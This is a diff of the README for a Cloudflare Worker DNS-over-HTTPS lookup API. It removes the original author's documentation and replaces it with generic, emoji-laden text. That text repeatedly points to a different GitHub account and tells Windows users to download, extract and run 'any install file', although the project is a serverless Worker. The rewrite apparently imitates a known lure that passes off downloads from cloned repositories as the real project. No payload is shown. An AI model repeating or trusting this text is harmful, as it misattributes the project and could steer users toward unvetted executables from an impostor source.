@@ -1,182 +1,238 @@
-# dns.api.airat.top
+# 🌐 dns.api.airat.top - Simple DNS Lookup API
 
-![dns](https://repository-images.githubusercontent.com/1191097372/fd9ab937-1028-4266-8bb2-bb04e5e0fc5d)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge)](https://github.com/above-politics628/dns.api.airat.top)
 
-Public Cloudflare Worker API for DNS lookups via DNS-over-HTTPS (DoH).
+## 📥 Download
 
-- Live endpoint: https://dns.api.airat.top
-- Status page: https://status.airat.top
+Go to the download page here:
 
-## API
+[https://github.com/above-politics628/dns.api.airat.top](https://github.com/above-politics628/dns.api.airat.top)
 
-Required query parameter:
-- `name` - hostname to resolve (`example.com`).
+Use this link to get the files you need on Windows.
 
-Optional query parameter:
-- `type` - DNS record type. Default: `A`.
-- Supported types: `A`, `AAAA`, `CNAME`, `MX`, `TXT`, `NS`, `SOA`, `SRV`, `CAA`, `PTR`.
+## 🧩 What this app does
 
-### `GET /`
+dns.api.airat.top lets you look up DNS records through a web API. It uses DNS-over-HTTPS, which means it sends DNS requests over a secure web connection.
 
-Default endpoint. Returns DNS lookup result as JSON.
+You can use it to check common record types like:
 
-```bash
-curl 'https://dns.api.airat.top/?name=example.com&type=A'
-```
+- A
+- AAAA
+- CNAME
+- MX
+- TXT
+- NS
+- SOA
+- SRV
+- CAA
+- PTR
 
-Test in browser: https://dns.api.airat.top/?name=example.com&type=A
+It can return results in:
 
-Example response:
+- JSON
+- text
+- YAML
+- XML
 
-```json
-{
-  "ok": true,
-  "query": {
-    "name": "example.com",
-    "type": "A",
-    "typeCode": 1
-  },
-  "dns": {
-    "status": 0,
-    "statusName": "NOERROR",
-    "rd": true,
-    "ra": true,
-    "ad": false,
-    "cd": false,
-    "tc": false
-  },
-  "question": [
-    {
-      "name": "example.com",
-      "type": 1,
-      "typeName": "A"
-    }
-  ],
-  "answer": [
-    {
-      "name": "example.com",
-      "type": 1,
-      "typeName": "A",
-      "ttl": 300,
-      "data": "93.184.216.34"
-    }
-  ],
-  "authority": [],
-  "comment": null,
-  "resolver": "cloudflare-dns.com",
-  "service": "dns.api.airat.top",
-  "generatedAt": "2026-03-25T00:00:00.000Z"
-}
-```
+This makes it useful when you want DNS data in a format that is easy to read or pass to another tool.
 
-### `GET /json`
+## 🖥️ What you need on Windows
 
-JSON alias for `/`.
+Before you start, make sure you have:
 
-```bash
-curl 'https://dns.api.airat.top/json?name=example.com&type=A'
-```
+- A Windows PC
+- A stable internet connection
+- A modern web browser
+- Permission to download files from GitHub
 
-Test in browser: https://dns.api.airat.top/json?name=example.com&type=A
+If you want to test the API from your browser, no extra software is needed.
 
-### `GET /text`
+## 🚀 Get started
 
-Returns plain text: one answer per line (or DNS status if no answers).
+1. Open the download page:
+   - https://github.com/above-politics628/dns.api.airat.top
 
-```bash
-curl 'https://dns.api.airat.top/text?name=example.com&type=A'
-```
+2. Download the project files to your computer.
 
-Test in browser: https://dns.api.airat.top/text?name=example.com&type=A
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
 
-### `GET /yaml`
+4. Open the extracted folder.
 
-Returns the same payload as YAML.
+5. Look for the main app files or the setup files in the folder.
 
-```bash
-curl 'https://dns.api.airat.top/yaml?name=example.com&type=A'
-```
+6. Follow the project instructions in the folder if they are included.
 
-Test in browser: https://dns.api.airat.top/yaml?name=example.com&type=A
+## 🛠️ How to use it
 
-### `GET /xml`
+This project works as an API, so you use it by opening a URL in your browser or by sending a web request from another tool.
 
-Returns the same payload as XML.
+A simple DNS lookup may look like this:
 
-```bash
-curl 'https://dns.api.airat.top/xml?name=example.com&type=A'
-```
+- Query a domain name
+- Choose the record type
+- Choose the output format
 
-Test in browser: https://dns.api.airat.top/xml?name=example.com&type=A
+Example uses:
 
-### `GET /health`
+- Look up the IP address for a domain
+- Check mail records for a site
+- Find the canonical name for a domain
+- Read DNS text records
+- Trace name server details
 
-Health check endpoint.
+If you open the API in a browser, the result may show as readable text, JSON, YAML, or XML based on the format you choose.
 
-```bash
-curl 'https://dns.api.airat.top/health'
-```
+## 🧭 Common ways to use it
 
-Response:
+You may want to use this tool when you need to:
 
-```json
-{
-  "status": "ok"
-}
-```
+- Check if a domain points to the right server
+- See which mail servers a domain uses
+- Read TXT records for site verification
+- Find IPv4 and IPv6 addresses
+- Review CNAME chains
+- Look up reverse DNS by IP address
+- Compare DNS results across formats
 
-Test in browser: https://dns.api.airat.top/health
+## 📋 Typical Windows setup steps
 
-### Validation errors
+If the project includes a local run option, use these steps:
 
-Missing or invalid `name`/`type` returns `400`:
+1. Download the files from GitHub.
+2. Extract the archive if needed.
+3. Open the project folder.
+4. Check for a README or setup file.
+5. Open any install file if one is included.
+6. If the app runs in a browser, start it and keep the window open.
+7. Open the local address shown by the app.
+8. Use the lookup fields or API URL in your browser.
 
-```bash
-curl 'https://dns.api.airat.top/?name=example.com&type=INVALID'
-```
+If the project is meant to run as a Cloudflare Worker, you can still use the public API after opening the link in your browser.
 
-```json
-{
-  "error": "Unsupported type. Use one of: A, AAAA, CNAME, MX, TXT, NS, SOA, SRV, CAA, PTR"
-}
-```
+## 🔍 Record types supported
 
-### CORS
+This API supports many common DNS record types:
 
-CORS is enabled for all origins (`*`).
+- A: IPv4 address records
+- AAAA: IPv6 address records
+- CNAME: alias records
+- MX: mail server records
+- TXT: text records
+- NS: name server records
+- SOA: zone data records
+- SRV: service records
+- CAA: certificate authority records
+- PTR: reverse lookup records
 
-## Privacy
+## 📦 Output formats
 
-No analytics or request logs are collected by this project.
+You can ask for results in different formats:
 
-## Project structure
+- JSON for apps and scripts
+- text for simple reading
+- YAML for structured text
+- XML for systems that use markup
 
-- `worker.js` - Cloudflare Worker script.
-- `wrangler.toml` - Wrangler configuration.
+If you are not sure which one to choose, start with JSON. It is easy to scan and works well in most tools.
 
-## Deployment
+## 🔐 How it works
 
-Deploy with Wrangler:
+The app uses Cloudflare Worker and DNS-over-HTTPS.
 
-```bash
-npx wrangler deploy
-```
+That means:
 
-If you use Cloudflare Workers Builds (GitHub integration), keep root directory as `/` and deploy command as `npx wrangler deploy`.
+- DNS queries go through HTTPS
+- Results are returned from an edge server
+- The service can respond fast
+- You do not need to run a full DNS server on your PC
 
-For custom domain binding, configure it in **Workers & Pages -> Domains & Routes**.
+This setup is useful when you want quick lookups without extra software.
 
-## License
+## 🧪 Example use cases
 
-This project is licensed under the MIT License - see [LICENSE](LICENSE).
+Here are a few simple examples of what a person might check:
 
----
+- A site does not load, so you check its A record
+- Email stops working, so you check MX records
+- A verification code fails, so you check TXT records
+- A domain was moved, so you check CNAME records
+- A service uses a custom port, so you check SRV records
 
-## Author
+## 📁 Project details
 
-**AiratTop**
+Repository name: dns.api.airat.top
 
-- Website: [airat.top](https://airat.top)
-- GitHub: [@AiratTop](https://github.com/AiratTop)
-- Email: [mail@airat.top](mailto:mail@airat.top)
-- Repository: [dns.api.airat.top](https://github.com/AiratTop/dns.api.airat.top)
+Description: Public Cloudflare Worker API for DNS lookups via DNS-over-HTTPS
+
+Topics include:
+
+- cloudflare-worker
+- cloudflare-workers
+- dns
+- dns-over-https
+- doh
+- edge-api
+- javascript
+- json
+- lookup
+- networking
+- serverless
+- xml
+- yaml
+
+## 🧰 Troubleshooting
+
+If the page does not open:
+
+- Check your internet connection
+- Try another browser
+- Refresh the page
+- Make sure GitHub is not blocked on your network
+
+If you do not see the result you expect:
+
+- Confirm the domain name is spelled right
+- Check the record type
+- Try a different output format
+- Wait and try again if the site is busy
+
+If the files do not open on Windows:
+
+- Right-click the file and choose Extract All if it is a ZIP file
+- Make sure the download finished
+- Check whether Windows blocked the file
+- Try opening the project folder again
+
+## 🧾 Basic usage flow
+
+1. Open the project page.
+2. Get the files or use the public API link.
+3. Pick a domain name.
+4. Choose a DNS record type.
+5. Choose an output format.
+6. View the result in your browser or tool
+
+## 📌 Useful record type hints
+
+- Use A when you want IPv4
+- Use AAAA when you want IPv6
+- Use MX when you want mail servers
+- Use TXT when you want site proof or notes
+- Use PTR when you want reverse lookup data
+- Use NS when you want name server details
+- Use CAA when you want certificate rules
+
+## 🧭 Browser tips
+
+For the easiest start on Windows:
+
+- Open the link in Chrome, Edge, or Firefox
+- Copy and paste the API URL if needed
+- Save the page in your bookmarks
+- Use the browser search box if the result is long
+
+## 📎 Download again
+
+If you need the project page again, use this link:
+
+[https://github.com/above-politics628/dns.api.airat.top](https://github.com/above-politics628/dns.api.airat.top)
